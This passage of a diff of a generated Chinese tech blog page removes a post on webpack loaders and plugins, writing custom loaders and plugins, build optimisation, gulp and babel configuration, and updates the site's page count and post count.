/\.css$/,</div><div class="line">        include: [</div><div class="line">          path.join(__dirname, &apos;./src&apos;)</div><div class="line">        ],</div><div class="line">        use: [&apos;style-loader&apos;, &apos;css-loader&apos;] </div><div class="line">        //链式调用loader的时候，会以数组逆序的顺序执行，</div><div class="line">        //先执行css-loder,再执行style-loader</div><div class="line">      &#125;</div><div class="line">    ]</div><div class="line">  &#125;,</div><div class="line"></div><div class="line">2.</div><div class="line">module: &#123;</div><div class="line">    rules: [&#123;</div><div class="line">      test: /\.css$/,</div><div class="line">      include: [</div><div class="line">       path.join(__dirname, &apos;./src&apos;),</div><div class="line">      ],</div><div class="line">      use: ExtractTextPlugin.extract(&#123;</div><div class="line">        fallback: &apos;style-loader&apos;,</div><div class="line">        use: &apos;css-loader&apos;</div><div class="line">      &#125;)</div><div class="line">    &#125;]</div><div class="line">  &#125;,</div><div class="line"></div><div class="line">plugins: [</div><div class="line">    new ExtractTextPlugin(&apos;[name].css&apos;)</div><div class="line">  ]</div><div class="line">3.</div><div class="line">module: &#123;</div><div class="line">    rules: [&#123;</div><div class="line">      test: /\.css$/,</div><div class="line">      include: [</div><div class="line">       path.join(__dirname, &apos;./src&apos;)</div><div class="line">      ],</div><div class="line">      use: ExtractTextPlugin.extract(&#123;</div><div class="line">        fallback: &apos;style-loader&apos;,</div><div class="line">        use: [&apos;css-loader&apos;, &apos;autoprefixer-loader&apos;]</div><div class="line">      &#125;)</div><div class="line">    &#125;]</div><div class="line">  &#125;,</div><div class="line">  plugins: [</div><div class="line">    new ExtractTextPlugin(&apos;[name].css&apos;)</div><div class="line">  ]</div></pre></td></tr></table></figure></p>
-<p>5.配置插件plugin<br>插件目的在于解决 loader 无法实现的其他事,配置插件都在plugin数组中，数组每一项就是new一个plugin,插件的配置也在new时以参数形式传递进去<br>例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">//打包公共文件方式一：</div><div class="line"></div><div class="line">plugins: [</div><div class="line">    new CommonsChunkPlugin(&#123;</div><div class="line">      name: &apos;commons&apos;,</div><div class="line">      filename: &apos;commons.js&apos;</div><div class="line">    &#125;),</div><div class="line">    new ExtractTextPlugin(&apos;[name].css&apos;)</div><div class="line">  ]</div></pre></td></tr></table></figure></p>
-<p>常用插件：<br>CommonsChunkPlugin：将多个文件通用的东西打包成一个文件<br>webpack.optimize.CommonsChunkPlugin：require(‘webpack’),使用webpack的optimize.CommonsChunkPlugin将打包的文件转化为公共文件<br>HtmlWebpackPlugin：是依据一个简单的index.html模板，生成一个自动引用你打包后的JS文件的新index.html。这在每次生成的js文件名称不同时非常有用（比如添加了hash值）。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">//打包公共文件方式二：</div><div class="line"></div><div class="line">var path = require(&apos;path&apos;)</div><div class="line">var webpack = require(&apos;webpack&apos;)</div><div class="line"></div><div class="line">module.exports = &#123;</div><div class="line">  context: path.join(__dirname, &apos;./src&apos;),</div><div class="line">  entry: &#123;</div><div class="line">    app: &apos;./&apos;,</div><div class="line">    vendor: [&apos;jquery&apos;, &apos;underscore&apos;],//将文件中require的&apos;jquery&apos;, &apos;underscore&apos;打包成公共文件vendor.bundle.js</div><div class="line">  &#125;,</div><div class="line">  output: &#123;</div><div class="line">    path: path.join(__dirname, &apos;dist&apos;),</div><div class="line">    filename: &apos;bundle.js&apos;</div><div class="line">  &#125;,</div><div class="line">  plugins: [</div><div class="line">    new webpack.optimize.CommonsChunkPlugin(&#123; </div><div class="line">      name: &apos;vendor&apos;,</div><div class="line">      filename: &apos;vendor.bundle.js&apos;</div><div class="line">    &#125;)</div><div class="line">  ]</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p><a href="http://www.jianshu.com/p/42e11515c10f" target="_blank" rel="external">入门Webpack</a></p>
-<h1 id="写一个webpack-的loader"><a href="#写一个webpack-的loader" class="headerlink" title="写一个webpack 的loader"></a>写一个webpack 的loader</h1><p>1.相当于写一个普通的模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">module.exports = function (source)&#123;</div><div class="line">  .....</div><div class="line">  ...</div><div class="line">  return xxx</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>2.获取配置参数<br>方式一<br>直接使用API:this.query<br>方式二<br>使用loader-utils库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">const loaderutils = require(&apos;loader-utils&apos;)</div><div class="line">const options = loaderutils.getOptions(this);</div></pre></td></tr></table></figure></p>
-<p>3.处理模块依赖<br>方式一：转化成require语句<br>例如,css-loader将@import和url(…)替换会require(…)<br>方式二：使用this.resolve函数解析路径<br>例如,less-loader将less编译器进行扩展自定义路径解析逻辑然后利用this.resolve解析依赖</p>
-<p>4.不要使用绝对路径<br>5.如果要包裹另外一个包将这个包作为peerDependency在package.json中引入<br>6.返回值<br>如果只是返回一个值可以用return<br>如果返回多个值需要调用API：this.callback(),但依然要在最后return一个undefined</p>
-<p>7.本地配置使用</p>
-<p>单个：path.resolve(‘../../loader.js’)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  test: /\.js$/</div><div class="line">  use: [</div><div class="line">    &#123;</div><div class="line">      loader: path.resolve(&apos;path/to/loader.js&apos;),</div><div class="line">      options: &#123;/* ... */&#125;</div><div class="line">    &#125;</div><div class="line">  ]</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>多个或一个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">module: &#123;</div><div class="line">    rules: [</div><div class="line">      &#123;</div><div class="line">        test: /\.js/,</div><div class="line">        use: [&#123;</div><div class="line">          loader:&apos;define-loader&apos;,</div><div class="line">          options:&#123;name:&apos;alice&apos;&#125;</div><div class="line">         &#125;</div><div class="line">        ],</div><div class="line">      &#125;</div><div class="line">    ]</div><div class="line">  &#125;,</div><div class="line">  resolveLoader: &#123;</div><div class="line">    modules: [</div><div class="line">      &apos;node_modules&apos;,</div><div class="line">      path.resolve(__dirname, &apos;loaders&apos;)</div><div class="line">    ]</div><div class="line">  &#125;</div></pre></td></tr></table></figure></p>
-<p><a href="https://www.webpackjs.com/contribute/writing-a-loader/" target="_blank" rel="external">中文</a><br><a href="https://webpack.js.org/development/how-to-write-a-loader/" target="_blank" rel="external">How to write a loader</a><br><a href="https://webpack.js.org/api/loaders/" target="_blank" rel="external">loader API</a></p>
-<h1 id="写一个webpack-的plugin"><a href="#写一个webpack-的plugin" class="headerlink" title="写一个webpack 的plugin"></a>写一个webpack 的plugin</h1><p>按照格式，根据compiler 和 compilation 对象处理流程上的钩子函数，<br>在不同阶段插入我们要做的事情<br>1.格式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">class DefPlugin &#123;</div><div class="line">  constructor(name) &#123;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  apply(compiler) &#123;</div><div class="line">  // 指定挂载的webpack事件钩子。</div><div class="line">    compiler.plugin(&quot;compile&quot;, function(params) &#123;</div><div class="line">       console.log(&quot;The compiler is starting to compile...&quot;);</div><div class="line">     &#125;);</div><div class="line">     // 指定挂载的webpack事件钩子。</div><div class="line">    compiler.plugin(&apos;emit&apos;, function(compilation, callback) &#123;</div><div class="line">      // 现在设置回调来访问编译中的步骤：</div><div class="line">    compilation.plugin(&quot;optimize&quot;, function() &#123;</div><div class="line">      console.log(&quot;Assets are being optimized.&quot;);</div><div class="line">    &#125;);</div><div class="line">    //功能完成后调用webpack提供的回调。</div><div class="line">    callback();</div><div class="line"></div><div class="line">  &#125;)</div><div class="line"> &#125;</div><div class="line">&#125;</div><div class="line">module.exports = DefPlugin</div></pre></td></tr></table></figure></p>
-<p>2.使用<br>直接在webpack.config.js文件中require一下就好<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">const Plugin = require(&apos;./myplugin&apos;)</div><div class="line"></div><div class="line">module.exports = &#123;</div><div class="line">    context: path.join(__dirname, &apos;src&apos;),</div><div class="line">    entry: &apos;./index.js&apos;,</div><div class="line">    output: &#123;</div><div class="line">        libraryTarget: &apos;commonjs2&apos;,</div><div class="line">        path: path.join(__dirname, &apos;dist&apos;),</div><div class="line">        filename: &apos;./bundle.js&apos;</div><div class="line">    &#125;,</div><div class="line">    plugins: [</div><div class="line">        new Plugin</div><div class="line">    ]</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>3.compiler<br>compiler 对象代表了完整的 webpack 环境配置。这个对象在启动 webpack 时被一次性建立，并在所有可操作的设置中被配置，包括原始配置，loader 和插件。当在 webpack 环境中应用一个插件时，插件将收到一个编译器对象的引用。可以使用它来访问 webpack 的主环境。<br><a href="https://github.com/webpack/webpack/blob/master/lib/Compiler.js" target="_blank" rel="external">源码</a><br>4.compilation<br>compilation 对象代表了一次单一的版本构建和生成资源。当运行 webpack 开发环境中间件时，每当检测到一个文件变化，一次新的编译将被创建，从而生成一组新的编译资源。一个编译对象表现了当前的模块资源、编译生成资源、变化的文件、以及被跟踪依赖的状态信息。编译对象也提供了很多关键点回调供插件做自定义处理时选择使用<br><a href="https://github.com/webpack/webpack/blob/master/lib/Compilation.js" target="_blank" rel="external">源码</a><br>5.tabable</p>
-<h1 id="webpack性能优化"><a href="#webpack性能优化" class="headerlink" title="webpack性能优化"></a>webpack性能优化</h1><p>1.将不再使用的依赖及时删除<br>2.不要为了实现小功能引入大型lib<br>3.合理配置babel<br>4.根据使用场景合理使用优化插件<br>例如使用happypack,webpack-uglify-parallel 在开发阶段进行多核并行压缩<br><a href="https://github.com/pigcan/blog/issues/1" target="_blank" rel="external">相关链接</a><br><a href="https://github.com/webpack-china/awesome-webpack-cn/" target="_blank" rel="external">学习链接</a></p>
-<h1 id="gulp"><a href="#gulp" class="headerlink" title="gulp"></a>gulp</h1><p>api:<br>task：<br>src:<br>watch：用来监视文件的变化；</p>
-<p>jshint：js 代码检查<br>uglify：压缩js<br>minify-css:压缩css<br>minfy-html:压缩html<br>concat:合并文件</p>
-<h1 id="babel"><a href="#babel" class="headerlink" title="babel"></a>babel</h1><p>babel是一个js转换器<br>可以将es6,es7,react/jsx的语法通过他的插件转编译成es5的或者说支持在现有环境运行的语法<br>使用babel,除了可以使用package.json进行配置，一般会为它建立专门的.babelrc文件进行配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  &quot;presets&quot;: [],</div><div class="line">  &quot;plugins&quot;: []</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>使用babel-preset-env转换es5,就将‘env’添加到.babelrc的presents数组中<br>使用babel-preset-react转换jsx,就将‘react’添加到.babelrc的presents数组中<br>使用babel-preset-stage-x转换es7不同阶段语法,就将‘stage-x’添加到.babelrc的presents数组中,x目前可以为0,1,2,3<br>使用babel-core模块，可以在代码中手动调用babelAPI进行转码<br>使用babel-polyfill模块，可以转换新版es6/es7里面的API,如generator,Symbol,Promise等<br>安装babel-cli实现命令行进行转码<br>另外babel经常用于前置转码，比如与eslint结合进行代码检查，与mocha进行脚本测试</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/7/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/9/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/page/7/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/19/">19</a><a class="extend next" rel="next" href="/page/9/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -1705,7 +1621,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">179</span>
+              <span class="site-state-item-count">181</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
